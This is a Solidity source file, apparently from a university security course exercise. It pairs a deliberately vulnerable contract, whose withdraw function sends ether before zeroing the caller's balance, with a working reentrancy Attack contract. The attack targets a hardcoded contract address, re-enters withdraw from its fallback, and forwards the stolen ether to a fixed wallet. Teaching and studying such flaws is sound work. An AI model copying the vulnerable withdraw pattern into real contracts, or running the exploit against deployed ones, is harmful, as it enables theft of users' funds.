/**
 *Submitted for verification at Etherscan.io on 2022-12-08
*/

pragma solidity ^0.5.0;

// This contract is vulnerable to having its funds stolen.
// Written for ECEN 4133 at the University of Colorado Boulder: https://ecen4133.org/
// (Adapted from ECEN 5033 w19)
// SPDX-License-Identifier: WTFPL
//
// Happy hacking, and play nice! :)
contract Vuln {
    mapping(address => uint256) public balances;

    function deposit() public payable {
        // Increment their balance with whatever they pay
        balances[msg.sender] += msg.value;
    }

    function withdraw() public {
        // Refund their balance
        msg.sender.call.value(balances[msg.sender])("");

        // Set their balance to 0
        balances[msg.sender] = 0;
    }
}

 contract Attack {
    
    bool heisted = false; 
    
    Vuln vuln0 = Vuln(address(0x66A2881fd91637fAD72A78Dd846446aD49b96A77));
    function attackOperation() public payable{
        vuln0.deposit.value(msg.value)();
        vuln0.withdraw();
    }

    function () external payable {
        address payable my_ETH = address(0xC19b3f24b30245cA8A8a1de3f7bEE52Cfb045FE0);
        my_ETH.transfer(msg.value);
            if(heisted == false){ 
                heisted = true;
                vuln0.withdraw(); 
        }
    }
}